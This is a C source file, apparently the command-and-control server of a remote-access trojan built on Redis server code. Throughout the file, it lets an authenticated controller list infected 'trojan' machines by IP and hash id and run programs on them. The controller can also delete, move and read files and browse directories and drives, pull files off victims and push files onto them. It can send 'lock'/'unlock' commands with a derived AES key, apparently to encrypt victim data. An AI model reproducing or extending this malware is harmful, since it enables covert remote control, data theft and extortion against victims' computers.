#include "server.h"
#include "mycommand.h"
#include "myutils.h"
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <malloc.h>
#include <pthread.h>

typedef struct thread_arg{
	int argc;
	void *c;
}thread_arg;

#define linkClients(client, trojan)\
	int flags = fcntl((trojan)->fd, F_GETFL);\
	do{\
	aeDeleteFileEvent(server.el, (client)->fd, AE_READABLE);\
	aeDeleteFileEvent(server.el, (client)->fd, AE_WRITABLE);\
	aeDeleteFileEvent(server.el, (trojan)->fd, AE_READABLE);\
	aeDeleteFileEvent(server.el, (trojan)->fd, AE_WRITABLE);\
	fcntl((trojan)->fd, F_SETFL, 0);\
	struct timeval tv;                                    \
	tv.tv_sec = 1;                                           \
	tv.tv_usec = 0;                                               \
	setsockopt((trojan)->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); \
	setsockopt((client)->fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)); \
	}while(0);

#define unlinkClients(client, trojan)\
	do{\
	aeCreateFileEvent(server.el, (client)->fd, AE_READABLE, readQueryFromClient, (client));\
	aeCreateFileEvent(server.el, (client)->fd, AE_WRITABLE, sendReplyToClient, (client));\
	aeCreateFileEvent(server.el, (trojan)->fd, AE_READABLE, readQueryFromClient, (trojan));\
	aeCreateFileEvent(server.el, (trojan)->fd, AE_WRITABLE, sendReplyToClient, (trojan));\
	fcntl((trojan)->fd, F_SETFL, flags);\
	}while(0);

#define generateThreadFunc(type)\
void type##Command(client* c){\
	pthread_t tid;\
	thread_arg* arg = zmalloc(sizeof(*arg));\
	arg->argc = c->argc;\
	arg->c = (void *) c;\
	int ret = pthread_create(&tid, NULL, type##_thread_func, (void*) arg);\
	if(ret){\
		addReply(c, shared.err);\
		return;\
	}\
	return;\
}

#define generateCommandTimes(type, value) \
void type##Command(client *c) {\
	client *cl = genericGetClient(c);\
	if(cl == NULL){\
		addReplySds(c, sdsnew("-ERR CAN'T FIND CLIENT.\r\n"));\
		return;\
	}\
	addReply(cl, shared.mbulkhdr[(value)]);\
	addReplyBulkCString(cl, ""#type);\
	if(c->cur_trojan){\
		for(int i = 1; i < (value); i++) \
			addReplyBulkCString(cl, c->argv[i]->ptr);\
	}\
	else{\
		for(int i = 1; i < (value); i++) \
			addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
	}\
\
	addReply(c, shared.ok);\
}

client* threadGetClient(client* c, int argc){
	listNode *ln;
	listIter li;

	if(c->enable_client != true || c->is_control != true){
		addReply(c, shared.err);
		return NULL;
	}

	client* cl = NULL;
	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		cl = listNodeValue(ln);
		if(!cl || !cl->hashid || cl->enable_client == false){
			cl = NULL;
			continue;
		}
		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
			break;
		}
		if(!c->cur_trojan && argc >= 2 && !strcmp(c->argv[1]->ptr, cl->hashid)){
			break;
		}
		if(!c->cur_trojan && argc >= 2 && !strncmp(c->argv[1]->ptr, cl->hashid + 1, 5)){
			break;
		}
		cl = NULL;
	}
	return cl;
}

client* genericGetClient(client* c){
	listNode *ln;
	listIter li;

	if(c->enable_client != true || c->is_control != true){
		addReply(c, shared.err);
		return NULL;
	}

	client* cl = NULL;
	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		cl = listNodeValue(ln);
		if(!cl || !cl->hashid || cl->enable_client == false){
			cl = NULL;
			continue;
		}
		if(c->cur_trojan && !strcasecmp(c->cur_trojan, cl->hashid)){
			break;
		}
		if(!c->cur_trojan && c->argc >= 2 && !strcmp(c->argv[1]->ptr, cl->hashid)){
			break;
		}
		if(!c->cur_trojan && c->argc >= 2 && !strncmp(c->argv[1]->ptr, cl->hashid + 1, 5)){
			break;
		}
		cl = NULL;
	}
	return cl;
}

void inCommand(client *c){
	listNode *ln;
	listIter li;
	long place;
	int s = string2l(c->argv[1]->ptr, strlen(c->argv[1]->ptr), &place);
	if(s && c->enable_client && c->is_control){
		listRewind(server.clients, &li);
		client *cl = NULL;
		while((ln = listNext(&li))){
			cl = listNodeValue(ln);
			if(!cl || !cl->enable_client || cl->is_control || cl == c){
				cl = NULL;
				continue;
			}
			if(--place <= 0)
				break;
			else
				cl = NULL;
		}
		if(cl == NULL){
			addReply(c, shared.err);
			return;
		}
		if(c->cur_trojan)
			sdsfree(c->cur_trojan);
		c->cur_trojan = sdsdup(cl->hashid);
		addReply(c, shared.ok);
		return;
	}

	addReply(c, shared.err);
	return;
}

void outCommand(client *c){
	if(c->cur_trojan){
		sdsfree(c->cur_trojan);
		c->cur_trojan = NULL;
		addReply(c, shared.ok);
		return;
	}

	addReply(c, shared.err);
	return;
}

void enableCommand(client *c){
	listNode *ln;
	listIter li;
	if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "1", 1)){
		listRewind(server.clients, &li);
		while((ln = listNext(&li))){
			client *cl = listNodeValue(ln);
			if(!cl || !cl->hashid || cl->enable_client != true)
				continue;
			if(!strcasecmp(c->argv[2]->ptr, cl->hashid)){
				printf("conflict hashid: %s, client fd: %d, %d", cl->hashid, c->fd, cl->fd);
				addReply(c, shared.err);
				c->flags |= CLIENT_CLOSE_AFTER_REPLY;
				return;
			}
		}
		c->hashid = sdsnew(c->argv[2]->ptr);
		c->enable_client = true;
		c->is_control = false;
		addReply(c, shared.ok);
	}
	else if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "2", 1) && (!server.secretphrase || !strncmp(c->argv[2]->ptr, server.secretphrase, sdslen(server.secretphrase)))){
		c->enable_client = true;
		c->is_control = true;
		addReply(c, shared.ok);
	}
	else
		addReply(c, shared.err);
	return;
}

void getClientsCommand(client *c){
	listNode* ln;
	listIter li;
	char* buf[1024];
	int hasClient = 0;

	memset(buf, 0, sizeof(buf));
	if(!c->enable_client || !c->is_control){
		addReply(c, shared.err);
		return;
	}

	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		client* cl = listNodeValue(ln);
		if(!cl || !cl->enable_client || cl->is_control || cl == c){
			continue;
		}
		hasClient++;
		buf[hasClient - 1] = zmalloc(sizeof(char) * 1024);
		memset(buf[hasClient - 1], 0, 1024 * sizeof(char));

		struct sockaddr_in sa;
		socklen_t len = sizeof(sa);
		if(!getpeername(cl->fd, (struct sockaddr*)&sa, &len)){
			sprintf(buf[hasClient - 1] + strlen(buf[hasClient - 1]), "%s;%d;%s;", inet_ntoa(sa.sin_addr), sa.sin_port, cl->hashid);
		}
	}
	if(!hasClient){
		addReply(c, shared.emptymultibulk);
		return;
	}
	addReply(c, shared.mbulkhdr[hasClient]);
	for(int i = 0; i < hasClient; i++)
		addReplyBulkCString(c, buf[i]);

	return;
}

void lockCommand(client *c){
	unsigned char hash[20];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	if(c->cur_trojan)
		gethashforaes(sdsdup(c->cur_trojan), hash);
	else
		gethashforaes(sdsnew(c->argv[1]->ptr), hash);
	memset(hash + 16, 0, 4);

	addReply(cl, shared.mbulkhdr[3]);
	if(!strcasecmp(c->argv[0]->ptr, "lock"))
		addReplyBulkCString(cl, "lock");
	else
		addReplyBulkCString(cl, "unlock");
	addReplyBulkSds(cl, sdsnewlen(hash, 16));
	if(c->cur_trojan)
		addReplyBulkCString(cl, c->argv[1]->ptr);
	else
		addReplyBulkCString(cl, c->argv[2]->ptr);

	addReply(c, shared.ok);
	return;
}

/* low level of download file api*/
int  _download(int fd, char* filename){
	packet pac;
	int count, ret;
	int file = open(filename, O_WRONLY|O_CREAT, 0666);
	while(1){
		memset(&pac, 0, sizeof(pac));
		count = read(fd, &pac, sizeof(pac));

		if(count > 0){
			switch(pac.type){
			case 1:
				ret = write(file, pac.data, sizeof(pac.data));
				if(ret < 0)
					goto err;
				break;
			case 2:
				ret = write(file, pac.data, count - 1);
				close(file);
				return 1;
			default:
				goto err;
			}
		}
		else{
err:		close(file);
			return 0;
		}
	}
	
}

int _upload(int fd, char* filename){
	packet pac;
	int count, ret, leftcount = 1;
	struct stat stbuf;
	int file = open(filename, O_RDONLY);
	if(file == -1 || fstat(file, &stbuf) != 0)
		goto err;
	leftcount = stbuf.st_size;
	while(1){
		memset(&pac, 0, sizeof(pac));
		count = read(file, &pac.data, sizeof(pac.data));
		leftcount -= count;
		if(count > 0){
			if(leftcount > 0){
				pac.type = 1;
				ret = write(fd, &pac, sizeof(pac));
				if(ret < 0)
					goto err;
			}
			else{
				pac.type = 2;
				ret = write(fd, &pac, count + 1);
				close(file);
				return 1;
			}
		}
		else{
err:		pac.type = 0;
			ret = write(fd, &pac, sizeof(pac));
			close(file);
			return 0;
		}
	}

}

/* file transport*/
void* download_thread_func(void* arg){
	int ret;
	packet pac;
	int argc = ((thread_arg *) arg)->argc;
	client* c = (client *) ((thread_arg *)arg)->c;

	client *cl = threadGetClient(c, argc);

	if(cl == NULL){
		addReply(c, shared.err);
		return NULL;
	}

	linkClients(c, cl);
	/* send cmd to the trojan client */
	memset(&pac, 0, sizeof(pac));
	char* download_file = (char*) c->argv[c->cur_trojan? 1: 2]->ptr;
	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n",(unsigned int) strlen(download_file), download_file);

	ret = write(cl->fd, pac.data, strlen(pac.data));
	if(ret < 0){
		unlinkClients(c, cl);
		addReply(c, shared.err);
		return NULL;
	}

	ret = read(cl->fd, &pac, sizeof(pac));
	if(pac.type != 3){
		unlinkClients(c, cl);
		addReply(c, shared.err);
		return NULL;
	}

	char filenamebuf[1024];
	char *filename = NULL;

	if(c->cur_trojan){
		while(filename == NULL)
			filename = tmpnam(filenamebuf);
		if(_download(cl->fd, filename)){
			rename(filename, download_file);
			addReply(c, shared.ok);
			unlinkClients(c, cl);
			return NULL;
		}
		addReply(c, shared.err);
		unlinkClients(c, cl);
		return NULL;
	}
	else{
		/* cclient tranport! */
		ret = write(c->fd, "+OK\r\n", sizeof("+OK\r\n"));
		while(1){
			memset(&pac, 0, sizeof(pac));
			ret = read(cl->fd, &pac, sizeof(pac));
			if(ret <= 0){
				pac.type = 0;
				ret = write(c->fd, &pac, sizeof(pac));
				unlinkClients(c, cl);
				return NULL;
			}
			/* handle tcp delay*/
			while(ret != sizeof(pac)){
				ret += read(cl->fd, (&pac) + ret, sizeof(pac) - ret);
			}
			printf("get data type: %d, len: %d , read data ret: %d\r\n", pac.type, pac.len, ret);
			switch(pac.type){
			case 1:
				ret = write(c->fd, &pac, sizeof(pac));
				break;
			case 2:
				ret = write(c->fd, &pac, sizeof(pac));
				unlinkClients(c, cl);
				return NULL;
			default:
				pac.type = 0;
				ret = write(c->fd, &pac, sizeof(pac));
				unlinkClients(c, cl);
				return NULL;
			}
		}
	}
	unlinkClients(c, cl);

	return NULL;
}

void*  upload_thread_func(void *arg){
	struct stat stbuf;
	int  cfd, leftcount = 1, count;
	packet pac;

	int argc = ((thread_arg *) arg)->argc;
	client* c = (client *) ((thread_arg *)arg)->c;

	client *cl = threadGetClient(c, argc);

	cfd = c->fd;

	if(cl == NULL){
		addReply(c, shared.err);
		return NULL;
	}
	linkClients(c, cl);
	memset(&pac, 0, sizeof(pac));
	sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n",
		   	(int)strlen(c->argv[c->cur_trojan? 1: 2]->ptr), (char*)c->argv[c->cur_trojan? 1: 2]->ptr);
	int ret = write(cl->fd, pac.data, strlen(pac.data));
	if(ret < 0)
		goto err;


	if(c->cur_trojan){
		cfd = open(c->argv[1]->ptr, O_RDONLY);
		if(cfd == -1 || fstat(cfd, &stbuf) != 0)
			goto err;
		leftcount = stbuf.st_size;
	}

	if(!c->cur_trojan){
		while(1){
			memset(&pac, 0, sizeof(pac));
			count = read(c->fd, &pac, sizeof(pac));
			if(count <= 0)
				goto err;
			switch(pac.type){
				case 1:
					ret = write(cl->fd, &pac, sizeof(pac));
					break;
				case 2:
					ret = write(cl->fd, &pac, count);
					unlinkClients(c, cl);
					return NULL;
				default:
					goto err;
			}
		}
	}
	while(1){
		memset(&pac, 0, sizeof(pac));
		count = read(cfd, &pac.data, sizeof(pac.data));
		leftcount -= count;
		if(count > 0 && leftcount > 0){
			pac.type = 1;
			ret = write(cl->fd, &pac, sizeof(pac));
			if(ret < 0)
				goto err;
		}
		else{
err:		pac.type = leftcount > 0? 0: 2;
			ret = write(cl->fd, &pac, sizeof(pac));
			unlinkClients(c, cl);
			c->cur_trojan? close(cfd): 0;
			if(c->cur_trojan)
			   	addReply(c, leftcount > 0? shared.err: shared.ok);
			return NULL;
		}
	}
	unlinkClients(c, cl);

	addReply(c, shared.ok);
	return NULL;
}

static void* ls_thread_func(void *arg){
	char buff[1400];
	int argc = ((thread_arg *) arg)->argc;
	client* c = (client *) ((thread_arg *) arg)->c;

	client *cl = threadGetClient(c, argc);
	zfree((thread_arg*)arg);

	if(cl == NULL){
		addReply(c, shared.err);
		return NULL;
	}
	linkClients(c, cl);

	memset(buff, 0, sizeof(buff));
	sprintf(buff, "*1\r\n$2\r\nls\r\n");
	int ret = write(cl->fd, buff, strlen(buff));
	if(ret < 0)
		goto err;

	memset(buff, 0, sizeof(buff));
	int count = read(cl->fd, buff, sizeof(buff));

	if(count > 0){
		ret = write(c->fd, buff, strlen(buff));
		if(ret < 0)
			goto err;
		while(count % 1400 == 0){
			memset(buff, 0, sizeof(buff));
			count = read(cl->fd, buff, sizeof(buff));

			ret = write(c->fd, buff, strlen(buff));
			if(ret < 0)
				goto err;
		}
	}
	else
	/* error handle*/
err:	addReply(c, shared.err);
	unlinkClients(c, cl);

	return NULL;
}


void* getDrivers_thread_func(void *arg){
	char buff[64];
	int argc = ((thread_arg *) arg)->argc;
	client* c = (client *) ((thread_arg *)arg)->c;

	client *cl = threadGetClient(c, argc);

	if(cl == NULL){
		addReply(c, shared.err);
		return NULL;
	}

	linkClients(c, cl);
	sprintf(buff, "*1\r\n$9\r\ngetDrives\r\n");
	int ret = write(cl->fd, buff, strlen(buff));
	if(ret < 0)
		goto err;

	memset(buff, 0, sizeof(buff));
	int count = read(cl->fd, buff, sizeof(buff));
	if(count > 0){
		ret = write(c->fd, buff, strlen(buff));
		if(ret < 0)
			goto err;
		unlinkClients(c, cl);
		return NULL;
	}
err:	/* error handle*/
	unlinkClients(c, cl);
	addReply(c, shared.err);
	return NULL;
}

/*    generateComamnd using macro      */
generateCommandTimes(new, 2)
generateCommandTimes(exe, 2)
generateCommandTimes(cat, 3)
generateCommandTimes(copy, 2)
generateCommandTimes(cut, 2)
generateCommandTimes(paste, 1)
generateCommandTimes(fpaste, 1)
generateCommandTimes(rm, 2)


/* directory control */
generateCommandTimes(rmdir, 2)
generateCommandTimes(cd, 2)
generateCommandTimes(mv, 3)
generateCommandTimes(mkdir, 2)

generateCommandTimes(up, 1)
generateCommandTimes(back, 1)

generateThreadFunc(ls)
generateThreadFunc(download)
generateThreadFunc(upload)
generateThreadFunc(getDrivers)
